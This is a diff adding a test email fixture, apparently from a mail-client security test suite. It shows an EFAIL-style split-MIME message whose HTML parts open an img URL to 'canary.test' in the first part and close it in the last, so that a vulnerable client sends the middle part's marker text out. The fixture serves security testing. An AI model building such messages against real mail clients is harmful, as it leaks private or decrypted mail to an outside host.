@@ -1,0 +1,22 @@
+From: Sender <sender@example.org>
+To: Reader <reader@example.com>
+Subject: Corpus message
+Date: Wed, 04 Nov 2026 10:00:00 +0000
+Message-ID: <html-efail-split-parts@corpus.test>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="B1"
+
+--B1
+Content-Type: text/html; charset=utf-8
+
+<p>Part one</p><img src="http://canary.test/efail?d=
+--B1
+Content-Type: text/html; charset=utf-8
+
+SECRET-MARKER-NOT-A-SECRET
+--B1
+Content-Type: text/html; charset=utf-8
+
+">
+--B1--
+
